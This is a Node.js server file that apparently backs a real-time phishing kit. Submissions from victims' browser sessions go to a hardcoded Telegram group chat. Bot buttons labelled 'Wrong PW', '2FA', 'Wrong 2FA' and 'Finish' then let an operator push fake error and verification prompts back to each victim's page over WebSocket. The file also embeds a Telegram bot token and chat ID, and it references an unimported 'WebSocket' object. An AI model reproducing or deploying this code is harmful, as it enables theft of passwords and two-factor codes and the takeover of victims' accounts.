const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { WebSocketServer } = require('ws');
const { v4: uuidv4 } = require('uuid');
const http = require('http');

const app = express();
const botToken = '7539675476:AAG3HvyqvP4xapW_k6HG_VlsOTWvjiK5z7M';
const bot = new TelegramBot(botToken, { polling: true });

const server = http.createServer(app);
const wss = new WebSocketServer({ server });

app.use(cors());
app.use(bodyParser.json());

const clients = new Map();
const messageToUserMap = new Map();

wss.on('connection', (ws, req) => {
  const userId = uuidv4();
  const ip = req.socket.remoteAddress;
  clients.set(userId, ws);

  console.log(`New client connected: UserID: ${userId}, IP: ${ip}`);
  ws.send(JSON.stringify({ type: 'welcome', userId, ip }));

  ws.on('message', (message) => {
    console.log(`Message from UserID ${userId}: ${message}`);
  });

  ws.on('close', () => {
    clients.delete(userId);
    console.log(`Client disconnected: UserID: ${userId}`);
  });
});

const sendToUser = (userId, data) => {
  const client = clients.get(userId);
  if (client && client.readyState === WebSocket.OPEN) {
    client.send(JSON.stringify(data));
  } else {
    console.error(`Client with UserID ${userId} is not connected.`);
  }
};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Welcome! Choose an action:', {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Show Modal', callback_data: 'show_modal' }],
        [{ text: 'Display Alert', callback_data: 'new_message' }],
        [{ text: 'Show Loading', callback_data: 'perform_action' }],
        [{ text: 'Wrong Email', callback_data: 'perform_action2' }],
        [{ text: 'Wrong PW', callback_data: 'perform_action3' }],
        [{ text: '2FA', callback_data: 'perform_action4' }],
        [{ text: '2FA Email', callback_data: 'perform_action7' }],
        [{ text: '2FA Auth', callback_data: 'perform_action8' }],
        [{ text: 'Wrong 2FA', callback_data: 'perform_action5' }],
        [{ text: 'Finish', callback_data: 'perform_action6' }],
      ]
    }
  });
});

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const userId = messageToUserMap.get(query.message.message_id);

  if (!userId) {
    console.error(`No userId found for message ID: ${query.message.message_id}`);
    return;
  }

  sendToUser(userId, { type: query.data, payload: `Triggered ${query.data}` });
  bot.answerCallbackQuery(query.id);
});

app.post('/send-message', (req, res) => {
  const { message, userId } = req.body;
  const chatId = '-1002327154709';

  if (!clients.has(userId)) {
    return res.status(404).send({ error: 'User not connected.' });
  }

  bot.sendMessage(chatId, `${message}`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Show Modal', callback_data: 'show_modal' }],
        [{ text: 'Display Alert', callback_data: 'new_message' }],
        [{ text: 'Show Loading', callback_data: 'perform_action' }],
        [{ text: 'Wrong Email', callback_data: 'perform_action2' }],
        [{ text: 'Wrong PW', callback_data: 'perform_action3' }],
        [{ text: '2FA', callback_data: 'perform_action4' }],
        [{ text: '2FA Email', callback_data: 'perform_action7' }],
        [{ text: '2FA Auth', callback_data: 'perform_action8' }],
        [{ text: 'Wrong 2FA', callback_data: 'perform_action5' }],
        [{ text: 'Finish', callback_data: 'perform_action6' }],
      ]
    }
  }).then((sentMessage) => {
    messageToUserMap.set(sentMessage.message_id, userId);
    console.log(`Message ID ${sentMessage.message_id} mapped to UserID ${userId}`);
  });

  sendToUser(userId, { type: 'acknowledge', payload: 'Message sent successfully!' });
  res.send({ status: 'Message sent to Telegram!' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
